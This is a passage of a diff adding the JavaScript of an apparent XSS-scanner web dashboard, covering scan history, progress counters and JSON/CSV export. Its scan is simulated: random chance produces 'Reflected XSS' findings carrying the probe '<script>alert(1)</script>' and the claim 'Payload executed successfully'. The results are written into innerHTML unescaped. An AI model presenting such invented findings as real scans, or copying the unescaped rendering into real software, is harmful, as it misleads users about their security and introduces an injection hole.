+
+        // Load history item
+        function loadHistoryItem(index) {
+            const item = scanHistory[index];
+            document.getElementById('targetUrl').value = item.url;
+            document.getElementById('testParameters').value = item.parameters.join(', ');
+            // In a real implementation, you would load more details
+            alert(`Loading scan from ${item.date}`);
+        }
+
+        // Clear history
+        function clearHistory() {
+            if (confirm('Are you sure you want to clear all scan history?')) {
+                scanHistory = [];
+                saveHistory();
+                renderHistory();
+            }
+        }
+
+        // Update dashboard
+        function updateDashboard() {
+            document.getElementById('vulnCount').textContent = vulnerabilitiesFound;
+            document.getElementById('testCount').textContent = completedTests;
+            document.getElementById('timeElapsed').textContent = `${Math.floor((Date.now() - scanStartTime) / 1000)}s`;
+            
+            const successRate = totalTests > 0 ? Math.round((vulnerabilitiesFound / totalTests) * 100) : 0;
+            document.getElementById('successRate').textContent = `${successRate}%`;
+            
+            // Update progress bars
+            document.getElementById('vulnProgress').style.width = `${Math.min(vulnerabilitiesFound * 10, 100)}%`;
+            document.getElementById('testProgress').style.width = totalTests > 0 ? `${Math.min((completedTests / totalTests) * 100, 100)}%` : '0%';
+            document.getElementById('successProgress').style.width = `${successRate}%`;
+            
+            // Update results stats
+            document.getElementById('totalTests').textContent = totalTests;
+            document.getElementById('vulnerabilities').textContent = vulnerabilitiesFound;
+            document.getElementById('successRateValue').textContent = `${successRate}%`;
+        }
+
+        // Scan functions (placeholder implementations)
+        function startQuickScan() {
+            startScan('quick');
+        }
+
+        function startDeepScan() {
+            startScan('deep');
+        }
+
+        function startCustomScan() {
+            startScan('custom');
+        }
+
+        function startFuzzing() {
+            startScan('fuzz');
+        }
+
+        function startScan(type) {
+            const url = document.getElementById('targetUrl').value;
+            if (!url) {
+                alert('Please enter a target URL');
+                return;
+            }
+            
+            // Reset counters
+            scanStartTime = Date.now();
+            totalTests = 0;
+            completedTests = 0;
+            vulnerabilitiesFound = 0;
+            scanResults = [];
+            
+            // Update UI
+            document.getElementById('resultsContainer').innerHTML = '<div class="result-card">Scanning in progress...</div>';
+            updateDashboard();
+            
+            // Simulate scanning process
+            simulateScan(type);
+            
+            // Add to history
+            const parameters = document.getElementById('testParameters').value.split(',').map(p => p.trim());
+            scanHistory.push({
+                url: url,
+                parameters: parameters,
+                date: new Date().toLocaleString(),
+                vulnerabilities: 0, // Will be updated when scan completes
+                type: type
+            });
+            saveHistory();
+            renderHistory();
+        }
+
+        // Simulate scanning process
+        function simulateScan(type) {
+            const testCounts = {
+                'quick': 10,
+                'deep': 50,
+                'custom': 25,
+                'fuzz': 100
+            };
+            
+            totalTests = testCounts[type];
+            let currentTest = 0;
+            
+            const interval = setInterval(() => {
+                currentTest++;
+                completedTests = currentTest;
+                
+                // Randomly find vulnerabilities
+                if (Math.random() < 0.2) {
+                    vulnerabilitiesFound++;
+                    addResult({
+                        parameter: 'testParam',
+                        payload: '<script>alert(1)</script>',
+                        type: 'Reflected XSS',
+                        status: 'Vulnerable',
+                        evidence: 'Payload executed successfully'
+                    });
+                }
+                
+                updateDashboard();
+                
+                if (currentTest >= totalTests) {
+                    clearInterval(interval);
+                    
+                    // Update history with final vulnerability count
+                    if (scanHistory.length > 0) {
+                        scanHistory[scanHistory.length - 1].vulnerabilities = vulnerabilitiesFound;
+                        saveHistory();
+                        renderHistory();
+                    }
+                    
+                    // Show completion message
+                    if (vulnerabilitiesFound === 0) {
+                        document.getElementById('resultsContainer').innerHTML = 
+                            '<div class="result-card"><div class="result-status success">No vulnerabilities found</div></div>';
+                    }
+                }
+            }, 100);
+        }
+
+        // Add result to the results container
+        function addResult(result) {
+            scanResults.push(result);
+            
+            const resultsContainer = document.getElementById('resultsContainer');
+            const resultCard = document.createElement('div');
+            resultCard.className = `result-card ${result.status === 'Vulnerable' ? 'vulnerable' : ''}`;
+            resultCard.innerHTML = `
+                <div class="result-header">
+                    <div class="result-title">Parameter: ${result.parameter}</div>
+                    <div class="result-status ${result.status === 'Vulnerable' ? 'vulnerable' : ''}">${result.status}</div>
+                </div>
+                <div class="result-details">
+                    <div class="detail-item">
+                        <div class="detail-label">Type:</div>
+                        <div class="detail-value">${result.type}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Payload:</div>
+                        <div class="detail-value">${result.payload}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Evidence:</div>
+                        <div class="detail-value">${result.evidence}</div>
+                    </div>
+                </div>
+            `;
+            
+            resultsContainer.appendChild(resultCard);
+        }
+
+        // Clear results
+        function clearResults() {
+            if (confirm('Are you sure you want to clear all results?')) {
+                document.getElementById('resultsContainer').innerHTML = '';
+                vulnerabilitiesFound = 0;
+                completedTests = 0;
+                totalTests = 0;
+                updateDashboard();
+            }
+        }
+
+        // Export results
+        function exportResults(format) {
+            if (scanResults.length === 0) {
+                alert('No results to export');
+                return;
+            }
+            
+            let data;
+            if (format === 'json') {
+                data = JSON.stringify(scanResults, null, 2);
+                downloadFile(data, 'xss-results.json', 'application/json');
+            } else if (format === 'csv') {
+                data = 'Parameter,Type,Status,Payload,Evidence\n';
+                scanResults.forEach(result => {
+                    data += `"${result.parameter}","${result.type}","${result.status}","${result.payload}","${result.evidence}"\n`;
+                });
+                downloadFile(data, 'xss-results.csv', 'text/csv');
+            }
+        }
+
+        // Generate report
+        function generateReport() {
+            alert('Report generation would be implemented in a full version of this tool');
+        }
+
+        // Download file helper
+        function downloadFile(content, fileName, contentType) {
+            const a = document.createElement('a');
+            const file = new Blob([content], {type: contentType});
+            a.href = URL.createObjectURL(file);
+            a.download = fileName;
+            a.click();
+        }
+
+        // Toggle collapsible sections
+        document.querySelectorAll('.collapsible-header').forEach(header => {
+            header.addEventListener('click', function() {
+                this.parentElement.classList.toggle('active');
+            });
+        });
+    </script>
+</body>
+</html>
